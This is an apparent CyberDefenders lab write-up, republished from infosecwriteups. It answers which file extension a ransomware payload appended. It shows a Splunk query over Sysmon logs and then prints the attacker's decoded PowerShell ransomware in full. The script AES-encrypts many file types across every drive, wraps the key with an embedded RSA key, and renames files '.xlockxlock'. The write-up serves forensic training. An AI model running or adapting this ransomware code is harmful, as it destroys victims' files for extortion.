# :game_die: Raining Dinosaurs Storm 2603 Lab Writeup Cyberdefenders 9C84Daa0D953

> **Original Source:** [Raining Dinosaurs Storm 2603 Lab Writeup Cyberdefenders 9C84Daa0D953](https://infosecwriteups.com/raining-dinosaurs-storm-2603-lab-writeup-cyberdefenders-9c84daa0d953)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

### Impact


>

*Q17: In the final stage of the attack, a ransomware payload was deployed across the compromised machines. What file extension was the ransomware designed to append to encrypted files?*


```
index=* host=DC01 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1 User = "NT AUTHORITY\\SYSTEM" NOT "chocolatey" NOT "splunk"
Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
CommandLine!="\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile"
| table _time, User, Image, CommandLine, ParentImage | sort _time desc
```


using this query we used before also, and decode last executed command:


```
function GER($n) {-join (1..$n|%{"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=+[]{}|;:',.<>?`~"
[(Get-Random -Maximum 74)]})}function err($pl,$sf)
{$rsa=New-Object System.Security.Cryptography.RSACryptoServiceProvider;
$rsa.FromXmlString($sf);$PB=[Text.Encoding]::UTF8.GetBytes($pl);
$rsa.Encrypt($PB,$false)} function gg($path) {$ke = GER(32);$ig =GER(16);
$sf = 'tdIXltqjmTpXRB43p+k6X9+JqBZvsD7+X4GsM0AVh0QS6Oev5RVAaQqc6m2pEKN7AYARcpz9iNy5JOB/T+OtWmqxd42bLH+iAUjc1kc1qk1Cg38t7obrGja8L7UMoJkb97ry0ngak9BlqaS7P+wzApOLVJoBNxaJ2rCoj7+Crh3p3Vm2/7/o4pMjgg4S838jw6aiRbag/v4SR86oupqjBvKxsAcZo5A4NDFoZ29j/IMa6GNpMkVjsNPjvB/GIqGcbTqJkb8HGSXw3KvHqwqfsB+01VTsbO7B8kIkOr4jB/M+bHFwgYkUG4rS2s/yJcOOkzH0tJwEj11tLv2bHSzoQQ==AQAB';
$eec=err -pl $ke+$ig -sf $sf;$eee=[System.Convert]::ToBase64String($eec);
$key=[System.Text.Encoding]::UTF8.GetBytes($ke);
$iv=[System.Text.Encoding]::UTF8.GetBytes($ig);
try{$files=gci $path -Recurse -Include .pdf,.txt, *.doc, *.docx, *.odt, *.rtf, *.md, *.csv, *.tsv, *.jpg, *.jpeg, *.tiff, *.mp3, *.xls, *.xlsx, *.ods, *.ppt, *.pptx, *.odp, *.py, *.java, *.cpp, *.c, *.html, *.css, *.js, *.php, *.swift, *.kotlin, *.go, *.rb, *.sh, *.sql, *.db, *.sqlite, *.sqlite3, *.mdb, *.sql, *.zip, *.rar, *.7z, *.tar, *.gz, *.bz2, *.iso, *.torrent, *.ini, *.json, *.xml, *.log, *.bak, *.cfg, *.psd, *.vmdk
| select -Expand FullName; foreach ($file in $files)
{ try {EFI $file $key $iv $eee} catch{}}} catch {Write-Host $ }}
function EFI($ifi,$key,$iv,$aT) {if($ifi.EndsWith(".xlockxlock",
[System.StringComparison]::OrdinalIgnoreCase)) {return};
$aes = [System.Security.Cryptography.Aes]::Create();$aes.KeySize = 256;
$aes.Key=$key;$aes.IV=$iv;
try{$yy=New-Object System.IO.FileStream($ifi, [System.IO.FileMode]::
Open,[System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None);
$xx=$aes.CreateEncryptor($aes.Key, $aes.IV);
$mm = New-Object System.Security.Cryptography.CryptoStream($yy, $xx, [System.Security.Cryptography.CryptoStreamMode]::Write);
$yy.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null; $jj = New-Object byte[] ($yy.Length);
$yy.Read($jj, 0, $jj.Length) | Out-Null; $yy.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
$mm.Write($jj, 0, $jj.Length); $mm.FlushFinalBlock(); $se = 1 }
catch { Write-Error $_ } finally {if ($mm) { $mm.Dispose() } if ($yy)
{ $yy.Dispose() } }try {$kk = [System.Text.Encoding]::UTF8.GetBytes($aT);
$bb = New-Object System.IO.FileStream($ifi,[System.IO.FileMode]::
Append,[System.IO.FileAccess]::Write,[System.IO.FileShare]::None);
if ($se){$bb.Write($kk, 0, $kk.Length)}} catch {Write-Error $_} finally
{if ($bb) { $bb.Dispose();if ($se){ren $ifi -NewName $ifi".xlockxlock";}}}};
$vg =gdr -PS FileSystem | select -Expand Root;foreach ($II in $vg)
{gg -path "$II"}
```


>

`.xlockxlock`

---

*Originally published on [Medium](https://infosecwriteups.com/raining-dinosaurs-storm-2603-lab-writeup-cyberdefenders-9c84daa0d953). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
